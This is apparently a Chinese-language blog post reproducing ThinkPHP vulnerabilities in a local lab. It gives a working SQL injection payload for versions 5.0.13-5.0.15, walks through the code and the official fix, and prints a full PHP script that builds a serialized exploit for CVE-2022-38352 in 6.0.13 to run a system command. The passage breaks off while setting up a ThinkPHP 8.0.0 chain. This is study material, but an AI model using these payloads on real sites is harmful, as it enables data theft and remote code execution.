[{"content":"ThinkPHP漏洞复现 ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架。下面就对几个漏洞点进行学习以及复现。\n首先需要配置好xdebug环境，这里可以参考我的另一篇文章：\nhttps://fupanc-w1n.github.io/p/phpstorm%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/\nThinkphp5 SQL注入漏洞 漏洞版本：5.0.13\u0026lt;=ThinkPHP\u0026lt;=5.0.15\n——————\n环境搭建 这里再简单说说环境搭建，后面其实都大差不差的。在github上下载v5.0.15的源码，然后在小皮中搭建一个网站即可，以composer.json文件所在目录为根目录，然后配置mysql，直接使用phpstudy上的即可，但是需要往里面插入数据：\n1 2 3 create database tp_text; create table users(username varchar(20)); insert into users value (\u0026#34;fupanc\u0026#34;),(\u0026#34;test\u0026#34;); 然后修改部分源码，在composer.json中指定版本：\n还可以看到这里的php版本要求，但是我这里就直接使用的7.3.4了，然后在这个目录下使用composer install就创建好了。\n然后在application/index/controller/Index.php中添加入口点，模仿一个数据查询的部分：\n即\n1 2 $username = request()-\u0026gt;get(\u0026#39;username/a\u0026#39;); db(\u0026#39;users\u0026#39;)-\u0026gt;insert([\u0026#39;username\u0026#39;=\u0026gt;$username]); 然后修改数据库的配置文件，位于application/database.php：\n再在application/config.php开启调试：\n1 2 3 4 // 应用调试模式 \u0026#39;app_debug\u0026#39; =\u0026gt; true, // 应用Trace \u0026#39;app_trace\u0026#39; =\u0026gt; true, phpstorm的配置就是前面给的文章，参考那个来配即可，简单修改一下如人口路径：\n最后成功打上断点：\n————\n这里其实就是要传参username，可以先简单加一个参数来调试一下过程，直接如下配置就行：\n代码审计 开始审计，打通的POC如下：\n1 ?username[0]=inc\u0026amp;username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)\u0026amp;username[2]=1 还是先从原配置的传参来，简单说明一下这里的添加的入口的代码逻辑：\n1 2 $username = request()-\u0026gt;get(\u0026#39;username/a\u0026#39;); db(\u0026#39;users\u0026#39;)-\u0026gt;insert([\u0026#39;username\u0026#39;=\u0026gt;$username]); 对于第一行代码，先是初始化了一个request对象，然后调用了get()函数，跟进这个get()函数：\n这里的get在类中的最初定义是一个空数组，然后会将$_GET（也就是get传参的内容）的值全部赋值给这个，然后会调用input()方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 public function input($data = [], $name = \u0026#39;\u0026#39;, $default = null, $filter = \u0026#39;\u0026#39;) { if (false === $name) { // 获取原始数据 return $data; } $name = (string) $name; if (\u0026#39;\u0026#39; != $name) { // 解析name if (strpos($name, \u0026#39;/\u0026#39;)) { list($name, $type) = explode(\u0026#39;/\u0026#39;, $name); } else { $type = \u0026#39;s\u0026#39;; } // 按.拆分成多维数组进行判断 foreach (explode(\u0026#39;.\u0026#39;, $name) as $val) { if (isset($data[$val])) { $data = $data[$val]; } else { // 无输入数据，返回默认值 return $default; } } if (is_object($data)) { return $data; } } // 解析过滤器 $filter = $this-\u0026gt;getFilter($filter, $default); if (is_array($data)) { array_walk_recursive($data, [$this, \u0026#39;filterValue\u0026#39;], $filter); reset($data); } else { $this-\u0026gt;filterValue($data, $name, $filter); } if (isset($type) \u0026amp;\u0026amp; $data !== $default) { // 强制类型转换 $this-\u0026gt;typeCast($data, $type); } return $data; } 简单过程，从前面可以看出来就是一些分割操作，在前面参数的定义中，username/a代表的就是接收一个数组类型的username参数，简单说一下后面的分割操作：\n前面有一个用/分割，获取到了参数的type，然后这里获取到了用.来分割，其实逻辑就是获取到username的值，这里是fupanc，所以会将$data值设置成了fupanc，并且这个值不是一个实例，所以也不会进入后面的if条件。\n继续往后面看：\n这里调用了getFilter()函数，就是一个获取过滤器的操作，但是我这里并没有特别设置filter，所以就是为空。\n再后面，这里我是直接传参的fupanc，不是数组类型，所以不hi进入后面的if语句，而在else语句中，可以看到的调用了filterValue()函数：\n类的传参如上，然后调用了array_pop()函数，就是去掉数组的最后一个元素。但是后面的is_callable函数是没有通过的，is_callable()函数就是判定是否可以作为为一个函数调用，很显然这里不行。而is_scalar()函数，就是检测是否是一个标量，标量变量是指那些包含了 integer、float、string 或 boolean 的变量，而 array、object 和 resource 则不是标量。这里的is_scalar函数虽然满足了，但是后面的is_scalar函数里面定义的if等语句都是不满足的，所以最后会直接return：\n然后就会调用到filterExp()函数：\n1 2 3 4 5 6 7 8 public function filterExp(\u0026amp;$value) { // 过滤查询特殊字符 if (is_string($value) \u0026amp;\u0026amp; preg_match(\u0026#39;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT LIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i\u0026#39;, $value)) { $value .= \u0026#39; \u0026#39;; } // TODO 其他安全过滤 } 这里就是一个sql注入的防御机制，大小写匹配来构建waf，如果匹配到了内容，那么就会直接将value后面加一个空格，但是本地测试了一下，这个过滤得比较一般呀。\n最后调用完filterEXP和filterValue函数过后就回到了input()函数：\n最后有一个类型转换，这里得$type变量就是在前面/分割那里分割出来的。最后，经过类型转换后，这里就会将data的值变成一个数组并将其返回：\n但是如果我直接传参时就是一个数组呢？还是简单改一下配置即可：\n然后再次调试即可，不同的点在于在调用input()方法时，is_array函数判断成功：\n然后会调用到array_walk_recursive()函数，其实就是会调用filterValue()函数，简单跟了一下。过程其实也是和前面差不多的，一个检测值的操作，这里就不多说了。最后调用reset()函数来输出数组第一个值，也就是fupanc，并且后面的操作也是差不多的，这里就不多说了。\n然后就到了数据库连接及插入操作了：\n1 db(\u0026#39;users\u0026#39;)-\u0026gt;insert([\u0026#39;username\u0026#39;=\u0026gt;$username]); 跟进这个db()方法：\n这里是连接数据库，并且指定了数据表为users表：\n然后调用了insert()方法：\n可以看到这里是调用了parseExpress()方法，跟了一下，里面就是对options这个变量进行了一下填充操作，在这个方法中，先是定义了一个$options变量，是一个数组类型，然后就是往这个数组类型的变量进行一些填充，里面有几个是后面要提到的点：\n这里的gettable()方法可以获取到table的名字，在这里就是users，并且将data的键设置为了空：\n然后后面有一个foreach操作，将键为fetch_sql的值设置为了false：\n然后在这方法之间，是进行了很多的填充，最后是返回了这个$option变量。\n退出了parseExpress()方法，然后调用了array_merrge()方法，这个是一个合并数组的操作，但是这里并没有合并？小怪，data的值还是没有改变。\n然后调用了insert()函数，这里的“发起者”是builder变量：\n看一下builder变量的定义：\n是数据库Builder对象实例，同时在这里，我们还可以看到一个数据库Connection对象实例。简单区别就是：\nConnection对象实例是表示数据库的连接实例，可以进行一些简单的SQL查询的功能，但是需要为一个完整的语句。\nbuilder对象实例，是一个数据库的查询构建器，用于动态生成复杂的SQL语句。\n然后就会调用到insert()方法：\n这里调用了一个parseData()函数，此时的参数传递如下：\n在这个函数中，在switch部分必须要匹配到，不然会直接退出导致不能执行sql执行操作，部分代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 $result = []; foreach ($data as $key =\u0026gt; $val) { $item = $this-\u0026gt;parseKey($key, $options); if (is_object($val) \u0026amp;\u0026amp; method_exists($val, \u0026#39;__toString\u0026#39;)) { // 对象数据写入 $val = $val-\u0026gt;__toString(); } if (false === strpos($key, \u0026#39;.\u0026#39;) \u0026amp;\u0026amp; !in_array($key, $fields, true)) { if ($options[\u0026#39;strict\u0026#39;]) { throw new Exception(\u0026#39;fields not exists:[\u0026#39; . $key . \u0026#39;]\u0026#39;); } } elseif (is_null($val)) { $result[$item] = \u0026#39;NULL\u0026#39;; } elseif (is_array($val) \u0026amp;\u0026amp; !empty($val)) { switch ($val[0]) { case \u0026#39;exp\u0026#39;: $result[$item] = $val[1]; break; case \u0026#39;inc\u0026#39;: $result[$item] = $this-\u0026gt;parseKey($val[1]) . \u0026#39;+\u0026#39; . floatval($val[2]); break; case \u0026#39;dec\u0026#39;: $result[$item] = $this-\u0026gt;parseKey($val[1]) . \u0026#39;-\u0026#39; . floatval($val[2]); break; } } elseif (is_scalar($val)) { // 过滤非标量数据 if (0 === strpos($val, \u0026#39;:\u0026#39;) \u0026amp;\u0026amp; $this-\u0026gt;query-\u0026gt;isBind(substr($val, 1))) { $result[$item] = $val; } else { $key = str_replace(\u0026#39;.\u0026#39;, \u0026#39;_\u0026#39;, $key); $this-\u0026gt;query-\u0026gt;bind(\u0026#39;data__\u0026#39; . $key, $val, isset($bind[$key]) ? $bind[$key] : PDO::PARAM_STR); $result[$item] = \u0026#39;:data__\u0026#39; . $key; } } } return $result; 这里调用的foreach，会匹配到val[0]，也就是fupanc这个值，后面会进入到switch的语句中，然后就会进行switch匹配，如果这里不呢个匹配到，后面由于is_scalar函数匹配标量，不会进入，就会直接返回一个空数组（$result），然后再insert()函数中直接return 0了：\n1 2 3 4 $data = $this-\u0026gt;parseData($data, $options); if (empty($data)) { return 0; } 就不会有后面的替换操作返回一个正常的sql语句了。\n而返回了一个0过后呢，就不能执任何sql语句了：\n前面的在填充option时标注为了false，前面提到了，然后这里由于result为0，直接就不会执行后续操作了。导致最后的sql语句插入是没用的。\n现在再来仔细看一下这个POC:\n1 ?username[0]=inc\u0026amp;username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)\u0026amp;username[2]=1 这里的传参是加上了一个inc的，也就是说，转折点就是在switch语句，这里再看看switch的代码逻辑：\n1 2 3 4 5 6 7 8 9 10 switch ($val[0]) { case \u0026#39;exp\u0026#39;: $result[$item] = $val[1]; break; case \u0026#39;inc\u0026#39;: $result[$item] = $this-\u0026gt;parseKey($val[1]) . \u0026#39;+\u0026#39; . floatval($val[2]); break; case \u0026#39;dec\u0026#39;: $result[$item] = $this-\u0026gt;parseKey($val[1]) . \u0026#39;-\u0026#39; . floatval($val[2]); break; 这里会匹配val[0]的值，值的赋予是前面提到了的，也就是如果传参如下：\n1 username[0]=1\u0026amp;username[1]=2 那么这里的val的值就是包含到1和2两个值的数组，那么在这里，可以尝试传参：\n1 username[0]=exp\u0026amp;username[1]=fupanc 再看看情况呢，还是进不去，这里输出为：\n在exp后面似乎多了一个空格，phpstorrm的问题？\n那么在网页上传参试试呢，还是不行呢。\n那么最后再调试一下POC：\n1 ?username[0]=inc\u0026amp;username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)\u0026amp;username[2]=1 这下又完全正确了：\n这。。。\n那就看这个吧，在case中利用到的函数如下：\n1 2 3 case \u0026#39;inc\u0026#39;: $result[$item] = $this-\u0026gt;parseKey($val[1]) . \u0026#39;+\u0026#39; . floatval($val[2]); break; 这里的parseKey()函数最后其实返回的就是传进去的值，而floatval()函数则是将其转换为浮点型，最后相加，结果如下：\n返回的result不为空了，回到insert()函数，然后调用了array_keys和array_values函数来分别生成key和value的数组，也就是前面result中的值，然后进行了替换操作：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $fields = array_keys($data); $values = array_values($data); $sql = str_replace( [\u0026#39;%INSERT%\u0026#39;, \u0026#39;%TABLE%\u0026#39;, \u0026#39;%FIELD%\u0026#39;, \u0026#39;%DATA%\u0026#39;, \u0026#39;%COMMENT%\u0026#39;], [ $replace ? \u0026#39;REPLACE\u0026#39; : \u0026#39;INSERT\u0026#39;, $this-\u0026gt;parseTable($options[\u0026#39;table\u0026#39;], $options), implode(\u0026#39; , \u0026#39;, $fields), implode(\u0026#39; , \u0026#39;, $values), $this-\u0026gt;parseComment($options[\u0026#39;comment\u0026#39;]), ], $this-\u0026gt;insertSql); return $sql; 最后的sql语句为：\n1 INSERT INTO `users` (`username`) VALUES (updatexml(1,concat(0x7e,user(),0x7e),1)+1) 最后成功执行：\n成功进行报错注入：\n——————\n修复方案 官方的修复方案是修改switch语句的逻辑：\n1 2 3 4 5 6 7 8 9 10 11 switch (strtolower($val[0])) { case \u0026#39;inc\u0026#39;: $result[$item] = $this-\u0026gt;parseKey($val[1]) . \u0026#39;+\u0026#39; . floatval($val[2]); break; case \u0026#39;dec\u0026#39;: $result[$item] = $this-\u0026gt;parseKey($val[1]) . \u0026#39;-\u0026#39; . floatval($val[2]); break; case \u0026#39;exp\u0026#39;: $result[$item] = $val[1]; break; } 总结 第一次审下来，确实代码审计需要比较细心呀，有些时候就是一些传参就能达到注入的效果，还有需要注意代码之间的联系，有些时候在代码的后半段会有比较重要的代码逻辑体现，还是多加注意。\nThinkphp v6.0.13反序列化漏洞 CVE-2022-38352\n环境搭建 和之前有点不一样了，thinkphp6以上就只有使用composer来安装了，比如这里的使用方法是：\n1 2 composer create-project topthink/think=6.0.13 think-6.0.13 //简单解析一下，这里就是指定了thinkphp的版本，然后这里的tp6就是将源码下载在当前目录的tp6目录下 如果有报错的话一般就是php.ini配置文件有些配置需要修改，比如需要开启zip的配置等，其实问AI都能问出来。\n然后访问网站的public/index.php，如果报错Your Composer dependencies require a PHP version “＞= 7.4.0，那么就需要改一下配置文件：\n1 2 3 \u0026#34;config\u0026#34;:{ \u0026#34;platform-check\u0026#34;: false } 此时搭建成功，但是会发现版本不对，所以需要\n还是改配置，在framework这里直接指定版本：\n1 2 3 4 5 \u0026#34;require\u0026#34;: { \u0026#34;php\u0026#34;: \u0026#34;\u0026gt;=7.2.5\u0026#34;, \u0026#34;topthink/framework\u0026#34;: \u0026#34;6.0.13\u0026#34;, \u0026#34;topthink/think-orm\u0026#34;: \u0026#34;^2.0\u0026#34; }, 然后再使用composerr update即可，最后成功搭建：\n下载来的源码可以看到这里的php版本要求是大于等于7.2.5的，这里还是直接使用前面的7.3.4即可。\n然后在app\\controller\\Index.php文件中加上入口：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php namespace app\\controller; use app\\BaseController; class Index extends BaseController { public function index() { if($_POST[\u0026#34;a\u0026#34;]){ unserialize(base64_decode($_POST[\u0026#34;a\u0026#34;])); } return \u0026#39;\u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: \u0026#34;Century Gothic\u0026#34;,\u0026#34;Microsoft yahei\u0026#34;; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }\u0026lt;/style\u0026gt;\u0026lt;div style=\u0026#34;padding: 24px 48px;\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;:) \u0026lt;/h1\u0026gt;\u0026lt;p\u0026gt; ThinkPHP V\u0026#39; . \\think\\facade\\App::version() . \u0026#39;\u0026lt;br/\u0026gt;\u0026lt;span style=\u0026#34;font-size:30px;\u0026#34;\u0026gt;16载初心不改 - 你值得信赖的PHP框架\u0026lt;/span\u0026gt;\u0026lt;/p\u0026gt;\u0026lt;span style=\u0026#34;font-size:25px;\u0026#34;\u0026gt;[ V6.0 版本由 \u0026lt;a href=\u0026#34;https://www.yisu.com/\u0026#34; target=\u0026#34;yisu\u0026#34;\u0026gt;亿速云\u0026lt;/a\u0026gt; 独家赞助发布 ]\u0026lt;/span\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;https://e.topthink.com/Public/static/client.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;think id=\u0026#34;ee9b1aa918103c4fc\u0026#34;\u0026gt;\u0026lt;/think\u0026gt;\u0026#39;; } public function hello($name = \u0026#39;ThinkPHP6\u0026#39;) { return \u0026#39;hello,\u0026#39; . $name; } } 代码审计分析 反序列化，一般都是从__destruct或者__wakeup入手的，这里还是从__destruct方法入手，直接全局搜索这个方法，可以看到有如下几个逻辑：\n搜到了如上几个方法，看了一下，感觉如下的两个点可能存在利用：\nLeague\\Flysystem\\Cached\\Storage\\AbstractCache ：\n1 2 3 4 5 6 public function __destruct() { if (! $this-\u0026gt;autosave) { $this-\u0026gt;save(); } } think\\Model ：\n1 2 3 4 5 6 public function __destruct() { if ($this-\u0026gt;lazySave) { $this-\u0026gt;save(); } } 看参考文章的入手点是AbstractCache抽象类的方法，所以就是第二个destruct()方法，简单跟一下。\nlazySave就是类的一个变量，在反序列化时可以赋值为任意值，跟进调用的save()方法，这里的AbstractCache类是抽象类，所以是必然有save()方法的实现了，AbstractCache类的实现类有如下几个：\n这里的链子是需要调用到League\\Flysystem\\Cached\\Storage\\Psr6Cache的save()方法：\n1 2 3 4 5 6 7 public function save() { $item = $this-\u0026gt;pool-\u0026gt;getItem($this-\u0026gt;key); $item-\u0026gt;set($this-\u0026gt;getForStorage()); $item-\u0026gt;expiresAfter($this-\u0026gt;expire); $this-\u0026gt;pool-\u0026gt;save($item); } 不是很清楚这里，确实会找子类的save()方法的实现，但是不知道为什么这里就是调用的这个类的save()方法，先不管，跟一下链子，后面分析一下生成逻辑。\n链子后面会再次调用到__call()方法，只要将这个理的$this-\u0026gt;pool设置为一个类即可，这里选用的是think\\log\\Channel类的__call()方法：\n1 2 3 4 public function __call($method, $parameters) { $this-\u0026gt;log($method, ...$parameters); } 参数传递的话，这里的$method是getItem()方法名，而$parameters就是前面传的$this-\u0026gt;key，看了一下，这个pool和key都是类定义的变量，所以这里都是可控的。然后跟进log()方法，会调用record()方法：\n1 2 3 4 public function log($level, $message, array $context = []) { $this-\u0026gt;record($message, $level, $context); } 然后再跟进record()方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 public function record($msg, string $type = \u0026#39;info\u0026#39;, array $context = [], bool $lazy = true) { if ($this-\u0026gt;close || (!empty($this-\u0026gt;allow) \u0026amp;\u0026amp; !in_array($type, $this-\u0026gt;allow))) { return $this; } if (is_string($msg) \u0026amp;\u0026amp; !empty($context)) { $replace = []; foreach ($context as $key =\u0026gt; $val) { $replace[\u0026#39;{\u0026#39; . $key . \u0026#39;}\u0026#39;] = $val; } $msg = strtr($msg, $replace); } if (!empty($msg) || 0 === $msg) { $this-\u0026gt;log[$type][] = $msg; if ($this-\u0026gt;event) { $this-\u0026gt;event-\u0026gt;trigger(new LogRecord($type, $msg)); } } if (!$this-\u0026gt;lazy || !$lazy) { $this-\u0026gt;save(); } return $this; } 继续看链子，在record()方法中，主要还是为了调用最后的save()方法，简单看一下前面的代码，看是否可以实现调用save()方法：\n前面总的来说是需要通过三个if条件，\n第一个if条件： 1 2 3 if ($this-\u0026gt;close || (!empty($this-\u0026gt;allow) \u0026amp;\u0026amp; !in_array($type, $this-\u0026gt;allow))) { return $this; } 就是需要$this-\u0026gt;close为false，然后后面的allow定义是一个数组，从代码逻辑来看，要么这个数组为空，要么这个数组里面存在getItem这个值，就不会进入这个if语句。\n第二个if条件： 1 2 3 4 5 6 7 8 if (is_string($msg) \u0026amp;\u0026amp; !empty($context)) { $replace = []; foreach ($context as $key =\u0026gt; $val) { $replace[\u0026#39;{\u0026#39; . $key . \u0026#39;}\u0026#39;] = $val; } $msg = strtr($msg, $replace); } 判断$msg是否为字符串类型，然后判断$context变量是否为空，这个$msg的值是可控的，而且从record()函数的形参来看，这里的$context变量就是一个空值，所以第二个if条件应该是不会进入的。\n第三个if条件： 1 2 3 4 5 6 if (!empty($msg) || 0 === $msg) { $this-\u0026gt;log[$type][] = $msg; if ($this-\u0026gt;event) { $this-\u0026gt;event-\u0026gt;trigger(new LogRecord($type, $msg)); } } 这里$msg不为空，就可以进入这个if条件，同样可以控制到不进入这个if条件，但是这里还不知道有什么用，先不管。\n最后到了调用save()方法的if语句： 1 2 3 if (!$this-\u0026gt;lazy || !$lazy) { $this-\u0026gt;save(); } 这里的$this-\u0026gt;lazy变量是类变量，可以控制。\n那么现在来看save()方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public function save(): bool { $log = $this-\u0026gt;log; if ($this-\u0026gt;event) { $event = new LogWrite($this-\u0026gt;name, $log); $this-\u0026gt;event-\u0026gt;trigger($event); $log = $event-\u0026gt;log; } if ($this-\u0026gt;logger-\u0026gt;save($log)) { $this-\u0026gt;clear(); return true; } return false; } 这里的$this-\u0026gt;logger可控，调用任意类的save()方法，或者__call()方法，但是这里的链子跟的是think\\log\\driver\\Socket类的save()方法：\n需要check()函数返回true，跟进check()函数：\n这里只需要控制$this-\u0026gt;config['force_client_ids']为true，$this-\u0026gt;config['allow_client_ids']为空，最后就会返回true。（ps:关键代码逻辑处理真重要呀，自己先看了一下，一直没提取出来重点，看了一下参考文章，这重点抓得是真准呀，只需要控制这几个参数就可以直接达到目的）。\n而对于这里得config，定义就是一个数组，如下：\n最后成功通过check()函数。回到save()函数，通过控制$this-\u0026gt;config['debug']为true，从而进入到if条件：\n然后这里是将$this-\u0026gt;app设置为了think\\APP类，但是这个APP类没有exists()方法，会调用到父类Container得exists()方法：\n从注释中可以看出这里就是在判断容器中是否有独享实例，参数传递中可以看出这里是判断是否有request这个类的实例，跟进这个getAlias()方法：\n1 2 3 4 5 6 7 8 9 10 11 12 public function getAlias(string $abstract): string { if (isset($this-\u0026gt;bind[$abstract])) { $bind = $this-\u0026gt;bind[$abstract]; if (is_string($bind)) { return $this-\u0026gt;getAlias($bind); } } return $abstract; } 对于第一个if语句，跟进判断的$this-\u0026gt;bind[$abstract]，由于这里的$this调用关系，这里判断的是App类的bind变量：\n可以看到这里是绑定到有Request.class类的，所以这里的getAlias()方法最后是会返回这个Request类的完全包名，也就是会返回think\\Request。然后回到exists()方法，会判断是否有实例化类，也就是$this-\u0026gt;instance['think\\Request']要为true，同样可以直接在类初始化时设置，比如$this-\u0026gt;instance赋值为['think\\Request'=\u0026gt;new Request()]。\n最后回到Socket文件的save()方法，然后就会调用Request类的url()方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 public function url(bool $complete = false): string { if ($this-\u0026gt;url) { $url = $this-\u0026gt;url; } elseif ($this-\u0026gt;server(\u0026#39;HTTP_X_REWRITE_URL\u0026#39;)) { $url = $this-\u0026gt;server(\u0026#39;HTTP_X_REWRITE_URL\u0026#39;); } elseif ($this-\u0026gt;server(\u0026#39;REQUEST_URI\u0026#39;)) { $url = $this-\u0026gt;server(\u0026#39;REQUEST_URI\u0026#39;); } elseif ($this-\u0026gt;server(\u0026#39;ORIG_PATH_INFO\u0026#39;)) { $url = $this-\u0026gt;server(\u0026#39;ORIG_PATH_INFO\u0026#39;) . (!empty($this-\u0026gt;server(\u0026#39;QUERY_STRING\u0026#39;)) ? \u0026#39;?\u0026#39; . $this-\u0026gt;server(\u0026#39;QUERY_STRING\u0026#39;) : \u0026#39;\u0026#39;); } elseif (isset($_SERVER[\u0026#39;argv\u0026#39;][1])) { $url = $_SERVER[\u0026#39;argv\u0026#39;][1]; } else { $url = \u0026#39;\u0026#39;; } return $complete ? $this-\u0026gt;domain() . $url : $url; } 可以控制url变量，测试了一下这里的if语句，只要有给$this-\u0026gt;url赋值，那么这里的if语句就为真，判断规则如下：\n所以我们可以给$url赋值为任意值。\n在最后的return语句，由于参数的传递，会调用$this-\u0026gt;domain()方法，然后是一个拼接url值得操作，跟进一下这里得domain()方法：\n1 2 3 4 public function domain(bool $port = false): string { return $this-\u0026gt;scheme() . \u0026#39;://\u0026#39; . $this-\u0026gt;host($port); } 调用domain()方法时没有传参，所以这里的$port为false，方法内容就是获取协议头和域名的操作，也就是获取包含当前协议的域名，但是这里会直接返回我们可控的host的值，代码逻辑如下：\n参数传递，会让$strict变量设置为false，在三目运算符中会得到后面的那个值，也就是$host的值。\n最后调用完url()函数过后，回到save()方法，会将返回的值赋值给$currentUri变量：\n然后这里只要控制$this-\u0026gt;config['format_head']不为空，就可以调用到think\\App类的invoke()方法，而这个$this-\u0026gt;config['format_head']，同样是可控的，而think\\App是没有invoke()方法的，其实还是调用的父类Container的invoke()方法：\n1 2 3 4 5 6 7 8 9 10 public function invoke($callable, array $vars = [], bool $accessible = false) { if ($callable instanceof Closure) { return $this-\u0026gt;invokeFunction($callable, $vars); } elseif (is_string($callable) \u0026amp;\u0026amp; false === strpos($callable, \u0026#39;::\u0026#39;)) { return $this-\u0026gt;invokeFunction($callable, $vars); } else { return $this-\u0026gt;invokeMethod($callable, $vars, $accessible); } } 然后链子是看第三个invokeMethod()方法：\n前面的分割类名和方法名的操作，最开始我本来是想要使用else中的方法来进行分割的，后面构造的时候发现有点问题，只能被解析成字符串，也有可能是我传参格式有点问题，其实这里使用前面的if语句中的条件才是最好用的，直接用一个数组传参即可，并且这里还有个invokeClass()方法来确保是一个obejct对象。然后看上图重点标注出来的部分，这里是一个反射操作，和java的很像，反射获取类及方法，然后动态执行。\n在这里，我们就可以找一下有无什么函数可以动态调用,可以用Seay源代码审计工具自动审计一下：\n可以看到这个display()函数是存在命令执行漏洞的，存在think\\view\\driver\\Php文件中，现在就是看怎么进行参数传递来打了，参数传递感觉也是很有意思的呀：\n在explode()函数中使用::来分割class和method，感觉传参是：\n1 2 a=new think\\view\\driver\\Php() a:: display 这样？感觉像是。\n然后再使用ReflectionMethod()方法来反射获取到要调用的方法，再然后使用bindParams()方法来绑定参数，最后调用invokeArgs()来执行这个方法。\n而在命令执行是如下：\n1 eval(\u0026#39;?\u0026gt;\u0026#39; . $this-\u0026gt;content); 如下就可以进行命令执行：\n1 2 3 4 \u0026lt;?php $content=\u0026#34;\\\u0026lt;?php system(\u0026#39;whoami\u0026#39;);?\u0026gt;\u0026#34;; eval(\u0026#39;?\u0026gt;\u0026#39; . $content); 所以传参就需要传\u0026lt;?php system('whoami');?\u0026gt;即可，这里的参数传递其实就是前面$currentUri的内容，也就是直接将前面的$url设置为php代码即可。\n最后的POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 \u0026lt;?php namespace League\\Flysystem\\Cached\\Storage; //abstract class AbstractCache //{ // protected $autosave = false; //} class Psr6Cache { private $pool; protected $autosave = false; function __construct($a){ $this-\u0026gt;pool=$a; } } namespace think\\log; class Channel{ protected $logger; protected $event; protected $lazy; function __construct($b){ $this-\u0026gt;lazy=false; $this-\u0026gt;event=false; $this-\u0026gt;logger=$b; } } namespace think\\view\\driver; class Php{ } namespace think\\log\\driver; class Socket{ protected $app; protected $config =[]; function __construct($b){ $this-\u0026gt;app=$b; $this-\u0026gt;config=[ \u0026#39;force_client_ids\u0026#39; =\u0026gt; true, \u0026#39;allow_client_ids\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;debug\u0026#39; =\u0026gt; true, \u0026#39;format_head\u0026#39; =\u0026gt; [new \\think\\view\\driver\\Php,\u0026#39;display\u0026#39;] ]; } } namespace think; class Request{ protected $url; function __construct(){ $this-\u0026gt;url=\u0026#34;\u0026lt;?php system(\u0026#39;calc\u0026#39;); ?\u0026gt;\u0026#34;; } } class App{ protected $instances = []; function __construct(){ $this-\u0026gt;instances=[ \u0026#39;think\\Request\u0026#39; =\u0026gt; new Request() ]; } } $d=new App; $b=new \\think\\log\\driver\\Socket($d); $a=new \\think\\log\\Channel($b); $c=new \\League\\Flysystem\\Cached\\Storage\\Psr6Cache($a); echo urlencode(base64_encode(serialize($c))); 其实基本链子知道了，就可以直接构造好类，然后生成序列化数据，如果还是有问题，在调试时再一步一步修改。\n最后是成功弹出计算机的：\n从页面显示是知道有回显的。所以可以直接打有回显的命令执行。\n问题解决 前面留了一个问题，不知道为什么会选择Psr6Cache类的save()方法。其实从整个构造过程下来看，就基本上已经懂了。首先，选用Psr6Cache类是完美符合链子的，其次，在java的学习中，我们可以知道在反序列化一个类时，同时还会反序列化它的父类，这样就会触发AbstractCache类的__destrcut()方法，从而使得链子执行。\n而页面回显的http://，其实就是链子中拼接url后的结果，但是php代码被执行了，所以只有这个回显：\n————\n总结 从这个链子中，学到了很多，关键代码的抓取、关键类的选取。。。\n感觉挖一条链子真的是要看很多代码呀，函数调用当然不难，但是要找到对应的函数，还是比较花耐心的，intersting，某两个方法配合起来就能打成一条链子。\n同时在这里知道，对于一些框架，有些漏洞点真可以去github issue上看，我看这条链子的POC就是在github issue上可以看到的，可以看参考文章。\n参考文章：\nhttps://github.com/top-think/framework/issues/2749\nhttps://xz.aliyun.com/news/11615?time__1311=eqUxuQDtDQitqAKD%3DD%2FFn%2BCBKqGQqD9QnGoD\u0026u_atoken=d85375bd9b5b083adb46a87b18f126c7\u0026u_asig=1a0c399a17410911216675510e012d\nhttps://blog.csdn.net/qq_29920751/article/details/87630803\nhttps://blog.csdn.net/qq_21296205/article/details/128369757\n——————————\nThinkphpv8.0.0 反序列化漏洞 需要使用php8，我这里是php8.2.9+thinkphp v8.0.0\n这个是nivia学长在2024xctf final出的题，当时他是挖出来的0day，这里也是来复现一下。\n——————\n环境搭建 环境搭建一个php8的环境，参考之前发的搭建的php7的调试环境教程，差不多的。\n然后下载源码：\n1 composer create-project topthink/think=8.0.0 think-8.0.0 改composer.json文件的框架版本为指定版本8.0.0，然后运行composer update更新一下即可。\n最后访问成功搭建：\n这里还是在app/controller/Index页面加一个入口即可：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php namespace app\\controller; use app\\BaseController; class Index extends BaseController { public function index() { unserialize(base64_decode($_POST[\u0026#39;a\u0026#39;])); return \u0026#39;\u0026lt;style\u0026gt;*{ padding: 0; margin: 0; }\u0026lt;/style\u0026gt;\u0026lt;iframe 